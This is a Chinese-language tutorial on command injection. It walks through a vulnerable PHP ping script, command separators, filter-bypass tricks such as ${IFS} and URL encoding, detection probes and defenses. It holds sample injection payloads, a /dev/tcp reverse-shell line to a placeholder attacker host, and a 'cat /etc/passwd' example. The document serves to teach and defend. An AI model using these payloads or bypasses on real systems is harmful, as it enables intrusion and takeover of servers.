# 命令注入

命令注入（Command Injection）是 Web 安全中一种非常危险的漏洞，攻击者通过构造恶意输入，使服务器执行任意系统命令，可能导致**服务器被完全控制**。

---

## 1. 命令注入

**命令注入（Command Injection）**是指程序在调用系统命令（如 `exec()`、`system()`、`popen()` 等）时，未对用户输入进行**过滤或校验**，攻击者将恶意命令插入进去，被服务器执行。

---

## 2. 常见受害函数

| 语言 | 常用函数 |
|------|----------|
| PHP | `exec()`、`system()`、`passthru()`、`shell_exec()`、`popen()` |
| Python | `os.system()`、`os.popen()`、`subprocess.call()` |
| Java | `Runtime.getRuntime().exec()` |
| Node.js | `child_process.exec()`、`spawn()` |
| C | `system()`、`popen()` |

---

## 3. 典型例子（PHP）

### 漏洞代码：
```php
<?php
$ip = $_GET['ip'];
system("ping -c 1 $ip");
?>
```

### 正常访问：
```
http://example.com/ping.php?ip=127.0.0.1
```

### 恶意访问：
```
http://example.com/ping.php?ip=127.0.0.1;id
```

### 后果：
服务端执行了：
```bash
ping -c 1 127.0.0.1;id
```
等价于执行了 `ping` 和 `id` 两个命令。

---

## 4. 命令拼接符

攻击者常用的操作符：


| 符号 | 功能 |
|------|------|
| `;` | 顺序执行多个命令 |
| `&&` | 当前命令成功才执行下一个 |
| `\|\|` | 当前命令失败才执行下一个 |
| `\|` | 管道符，把前一个命令的输出作为后一个命令的输入 |
| `` `cmd` `` | 执行命令，返回结果（如 `echo `id``） |
| `$(cmd)` | 执行命令，返回结果（如 `echo $(id)`） |

---

## 5. 命令注入与参数污染

### 示例：
```bash
ping -c 1 127.0.0.1 && whoami
```

如果命令拼接没有加引号或者没处理空格，就可能注入。

---

## 6. 黑名单绕过技巧

即使开发者试图过滤某些关键字，攻击者依然有方法绕过：

| 过滤策略 | 绕过方法                            |
|----------|---------------------------------|
| 过滤 `;` | 使用 `\|`、`&&`、换行符                |
| 过滤 `rm` | 编码绕过，如 `%72%6d`、`${IFS}rm`      |
| 过滤命令 | 使用符号替代、构造变量、子命令 `$(...)`        |
| 空格过滤 | 使用 `${IFS}`（内部字段分隔符） 或 `<>`、制表符 |

---

## 7. 危害

- 任意命令执行（如 `id`, `uname -a`, `cat /etc/passwd`）
- 文件读取 / 删除
- 远程反弹 Shell（如 `bash -i >& /dev/tcp/attacker/4444 0>&1`）
- 横向移动、提权

---

## 8. 检测方法

### 8.1 手工检测
尝试输入：
```
127.0.0.1;id
127.0.0.1&&whoami
127.0.0.1|uname -a
```

看响应是否出现命令执行结果。

### 8.2 工具检测

| 工具 | 功能 |
|------|------|
| Burp Suite + Intruder | 模拟注入点 |
| **Commix** | 自动化命令注入检测与利用（推荐） |
| OWASP ZAP | 被动扫描 |
| curl/wget | 结合手工探测 payload 响应变化 |

---

## 9. 防御措施

| 等级 | 方法 |
|----|------|
| 首选 | **避免使用系统命令执行函数**，用语言内建库替代 |
| 强校验 | 对用户输入做严格白名单校验，只允许合法字符（如 IP 地址） |
| 参数分离 | 使用参数数组代替拼接字符串，如 `subprocess.run(["ping", "-c", "1", ip])` |
| 最小权限 | 限制 Web 服务用户权限，禁止访问敏感系统命令 |
| WAF拦截 | 防御部分已知注入 payload |

---

